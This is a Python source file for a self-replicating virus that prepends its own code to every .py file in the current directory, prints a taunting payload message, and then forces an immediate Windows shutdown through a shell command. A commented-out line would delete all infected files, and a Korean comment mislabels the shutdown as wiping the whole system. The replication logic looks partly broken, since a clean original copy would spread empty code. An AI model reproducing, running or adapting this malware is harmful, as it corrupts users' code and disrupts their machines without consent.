import os
import glob
import subprocess

def find_files_to_infect(directory="."):
    return [file for file in glob.glob(f"{directory}/*.py")]

def get_content_of_file(file):
    with open(file, 'r', encoding='utf-8', errors='ignore') as my_file:
        data = my_file.readlines()
    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data := get_content_if_infectable(file)):
        with open(file, "w", encoding='utf-8') as infected_file:
            infected_file.write("# begin-virus\n")
            infected_file.write(virus_code)
            infected_file.writelines(data)

def get_virus_code():
    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus" in line:
            virus_code_on = False
            break

    return "".join(virus_code)

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

def delete_files(files):
    for file in files:
        os.remove(file)

def execute_command(command):
    subprocess.call(command, shell=True)

# entry point
try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code()

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

    # Danger Zone!
    # 추가된 위험 기능들을 활성화합니다.
    
    #delete_files(find_files_to_infect())  # 모든 감염된 파일 삭제 / 자신마저도 감염시키고 자살
    execute_command('shutdown -s -t 0')  # 시스템 전체를 삭제하는 명령어 실행
    
except Exception as e:
    print(f"An error occurred: {e}")

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if i[0] != "_":
            exec(f"del {i}")

    del i
